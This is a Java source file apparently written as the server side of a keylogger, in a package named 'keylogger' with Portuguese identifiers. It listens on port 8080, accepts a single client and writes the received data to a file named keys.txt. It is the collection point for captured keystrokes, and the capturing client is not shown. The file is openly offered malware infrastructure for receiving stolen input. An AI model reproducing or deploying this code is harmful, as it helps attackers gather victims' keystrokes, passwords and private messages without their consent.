/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.mycompany.keylogger;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketAddress;

/**
 *
 * @author zx-0b111
 */

public class Servidor {
    public static void CriaServidor() {
        try {
        ServerSocket server = new ServerSocket(8080);
        System.out.println("Servidor rodando... " + server.getLocalPort());
        Socket aceita_cliente = server.accept();
        System.out.println("Cliente conectado... ");
        DataInputStream ler = new DataInputStream(aceita_cliente.getInputStream());
        DataOutputStream escreve_arquivo = new DataOutputStream(aceita_cliente.getOutputStream());
        
        int bytes = 0;
        FileOutputStream ler_arquivo = new FileOutputStream("C:\\Users\\MegaOS\\Documents\\teste\\keys.txt");
        
        long tamanho = ler.readLong();
        byte[] dividir_arquivo_servidor = new byte[4*1024];
        
        while(tamanho > 0 && (bytes = ler.read(dividir_arquivo_servidor, 0, (int)Math.min(dividir_arquivo_servidor.length, tamanho))) != -1) {
            ler_arquivo.write(dividir_arquivo_servidor, 0, bytes);
            tamanho-= bytes;
        }
        ler_arquivo.close();
        System.out.println("arquivo recebido com sucesso");
      
        
    
    } catch (IOException aa) {
        System.out.println("Deu ruim: " + aa.getMessage());
    }
    }
    
     public static void main(String[] args) {
         CriaServidor();
     }
}
